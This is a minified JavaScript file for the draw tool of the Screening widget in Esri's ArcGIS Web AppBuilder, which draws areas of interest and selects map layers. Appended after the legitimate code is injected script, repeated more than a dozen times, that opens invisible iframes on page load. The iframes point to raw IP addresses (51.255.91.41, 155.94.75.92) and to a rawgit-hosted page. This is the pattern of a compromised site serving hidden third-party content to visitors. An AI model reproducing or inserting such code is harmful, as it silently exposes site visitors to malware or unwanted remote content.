// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Screening/drawTool/drawTool.html":'\x3cdiv\x3e\r\n  \x3cdiv class\x3d"esriCTDrawBoxLabel"\x3e${nls.drawToolWidget.useDrawToolForAOILabel}\x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTDrawToolIconsParentDiv" data-dojo-attach-point\x3d"drawToolIconsParentDiv"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTSelectToolParentDiv" data-dojo-attach-point\x3d"selectToolParent"\x3e\r\n    \x3cdiv class\x3d"esriCTSelectToolDiv" data-dojo-attach-point\x3d"selectToolDiv"\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTWidgetAndBufferSeparator" data-dojo-attach-point\x3d"seperatorAfterSelect"\x3e\r\n  \x3c/div\x3e\r\n  \x3cdiv class\x3d"esriCTParentDivOfChooseSymbol" data-dojo-attach-point\x3d"parentDivOfChooseSymbol"\x3e\r\n    \x3cdiv class\x3d"esriCTExpandCollapseParentContainer"\x3e\r\n      \x3cdiv class\x3d"esriCTLayerPanelOfSelectIcon esriCTLayerPanelExpandIcon" data-dojo-attach-point\x3d"layerSectionIcon"\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTSelectableLayerTitle esriCTEllipsis" data-dojo-attach-point\x3d"impactSummaryLayerTitle" title\x3d"${nls.drawToolWidget.chooseLayerTitle}"\x3e\r\n        ${nls.drawToolWidget.chooseLayerTitle}\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"esriCTImpactSummaryLayerMaxRecordHint esriCTHidden esriCTCursorPointer" data-dojo-attach-point\x3d"singleLayerSelectionWarning"\r\n        title\x3d"${nls.drawToolWidget.layerSelectionWarningTooltip}"\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv data-dojo-attach-point\x3d"entireLayerParentContainer" class\x3d"esriCTHidden"\x3e\r\n      \x3cdiv class\x3d"jimu-widget-screening-selectable-layer-item no-action"\x3e\r\n        \x3cdiv class\x3d"layer-row"\x3e\r\n          \x3cdiv class\x3d"selectable-check checked" title\x3d"${nls.drawToolWidget.selectAllLayersText}" data-dojo-attach-point\x3d"selectAllLayers"\x3e\r\n          \x3c/div\x3e\r\n          \x3cdiv class\x3d"layer-name jimu-ellipsis" title\x3d"${nls.drawToolWidget.selectAllLayersText}"\x3e${nls.drawToolWidget.selectAllLayersText}\x3c/div\x3e\r\n        \x3c/div\x3e\r\n      \x3c/div\x3e\r\n      \x3cdiv class\x3d"layer-nodes" data-dojo-attach-point\x3d"layerItemsNode"\x3e\r\n        \x3cdiv class\x3d"esriCTLayerItems"\x3e\x3c/div\x3e\r\n      \x3c/div\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dojo/text!./drawTool.html dijit/_WidgetsInTemplateMixin dojo/_base/lang dojo/Evented dojo/on dojo/dom-construct dojo/query dojo/dom-class dojo/_base/array jimu/BaseWidget jimu/dijit/DrawBox jimu/dijit/FeatureSetChooserForMultipleLayers jimu/SelectionManager esri/geometry/geometryEngine dojo/_base/html dojo/_base/array ./SelectableLayerItem jimu/dijit/Message".split(" "),function(l,m,n,d,p,e,q,g,b,k,r,t,u,v,w,h,f,x,y){return l([r,n,p],{baseClass:"jimu-widget-screening-drawTool",
templateString:m,_drawTool:null,_filteredLayerArray:[],selectTool:null,layerItems:null,constructor:function(a){this._drawTool=null;this._filteredLayerArray=[];this.layerItems=this.selectTool=null;d.mixin(this,a)},postCreate:function(){this.layerItems=[];this._createFeatureLayerArr();this._initializeDrawBoxTools();this._initializeSelectTool();this._setFeatureLayersForSelectTool();this._initLayers();this.own(e(this.layerSectionIcon,"click",d.hitch(this,this._showOrHideLayerDetailsContainer)));this.own(e(this.impactSummaryLayerTitle,
"click",d.hitch(this,this._showOrHideLayerDetailsContainer)));this.own(e(this.selectAllLayers,"click",d.hitch(this,this._selectAllLayers)));this.own(e(this.singleLayerSelectionWarning,"click",d.hitch(this,function(){this._showMessage(this.nls.drawToolWidget.layerSelectionWarningTooltip)})))},_initLayers:function(){h.empty(this.layerItemsNode);f.forEach(this._filteredLayerArray,d.hitch(this,function(a){if(a&&a.objectIdField&&a.geometryType){var c,b;f.forEach(this.layerInfoArray,d.hitch(this,function(b){b.id===
a.id&&(c=b)}));b=new x({layerInfo:c,checked:!0,layerVisible:!0,map:this.map,nls:this.nls});this.own(e(b,"stateChange",d.hitch(this,function(){this.emit("clearExistingSelection");this.selectTool.setFeatureLayers(this._getSelectableLayers());this._updateSelectAllState()})));b.init(a);h.place(b.domNode,this.layerItemsNode);b.startup();this.layerItems.push(b)}}))},_getSelectableLayers:function(){var a=[];f.forEach(this.layerItems,function(c){c.isLayerVisible()&&c.isChecked()&&a.push(c.featureLayer)},
this);return a},_showOrHideLayerDetailsContainer:function(){b.contains(this.layerSectionIcon,"esriCTLayerPanelCollapseIcon")?(b.add(this.entireLayerParentContainer,"esriCTHidden"),b.replace(this.layerSectionIcon,"esriCTLayerPanelExpandIcon","esriCTLayerPanelCollapseIcon")):(b.remove(this.entireLayerParentContainer,"esriCTHidden"),b.replace(this.layerSectionIcon,"esriCTLayerPanelCollapseIcon","esriCTLayerPanelExpandIcon"))},_selectAllLayers:function(){var a;h.toggleClass(this.selectAllLayers,"checked");
a=b.contains(this.selectAllLayers,"checked");f.forEach(this.layerItems,function(c){a?b.contains(c.selectableCheckBox,"checked")||c.selectableCheckBox.click():b.contains(c.selectableCheckBox,"checked")&&c.selectableCheckBox.click()})},_updateSelectAllState:function(){var a,c,d;d=!0;a=b.contains(this.selectAllLayers,"checked");f.forEach(this.layerItems,function(a){b.contains(a.selectableCheckBox,"checked")?d=!1:c=!0});c?b.remove(this.selectAllLayers,"checked"):a||b.add(this.selectAllLayers,"checked");
d?b.remove(this.singleLayerSelectionWarning,"esriCTHidden"):b.add(this.singleLayerSelectionWarning,"esriCTHidden")},_createFeatureLayerArr:function(){for(var a in this.filteredLayerObj)this.filteredLayerObj.hasOwnProperty(a)&&this._filteredLayerArray.push(this.filteredLayerObj[a])},_initializeDrawBoxTools:function(){var a;this._drawTool=new t({geoTypes:["POINT","POLYLINE","EXTENT","POLYGON"],map:this.map,pointSymbol:this.pointSymbol,polylineSymbol:this.polylineSymbol,polygonSymbol:this.polygonSymbol},
this.drawToolIconsParentDiv);this._drawTool.startup();this.own(e(this._drawTool,"draw-activate",d.hitch(this,function(a){this.selectTool.isActive()&&(this.selectTool.deactivate(),this._drawTool.drawToolBar.activate(a));"extent"===a&&this.map.disablePan();this.map.setInfoWindowOnClick(!1)})));this.own(e(this._drawTool,"draw-end",d.hitch(this,function(c){this._drawTool.drawLayer.clear();this.map.enablePan();(a="polygon"===c.geometry.type?w.simplify(c.geometry):c.geometry)?this.emit("onDrawComplete",
[c]):this._drawTool.drawLayer.clear();this.map.setInfoWindowOnClick(!0)})))},_initializeSelectTool:function(){var a;this.selectTool=new u({map:this.map,updateSelection:!0,fullyWithin:!1},this.selectToolDiv);a=g(".btn-clear",this.selectTool.domNode)[0];b.add(a,"esriCTHidden");a=g(".btn-select",this.selectTool.domNode)[0];this.own(e(a,"click",d.hitch(this,function(){this._drawTool.isActive()&&this._drawTool.deactivate();this.selectTool.isActive()&&this.map.disablePan()})));this.own(e(this.selectTool,
"unloading",d.hitch(this,function(){var a;a=this._getSelectedFeature();this.emit("onSelectionComplete",a)})));q.place(this.selectToolParent,g(".draw-items",this.domNode)[0],"last")},deactivateTools:function(){this._drawTool&&this._drawTool.isActive()&&this._drawTool.deactivate();this.selectTool&&this.selectTool.isActive()&&this.selectTool.deactivate();this.map.enablePan()},_setFeatureLayersForSelectTool:function(){this.selectTool.setFeatureLayers(this._filteredLayerArray)},_getSelectedFeature:function(){var a;
a=[];k.forEach(this._filteredLayerArray,d.hitch(this,function(b){a=a.concat(b.getSelectedFeatures())}));return a},clearAllSelections:function(){var a;a=v.getInstance();k.forEach(this._filteredLayerArray,d.hitch(this,function(b){a.clearSelection(b)}))},_showMessage:function(a){(new y({message:a})).message=a}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});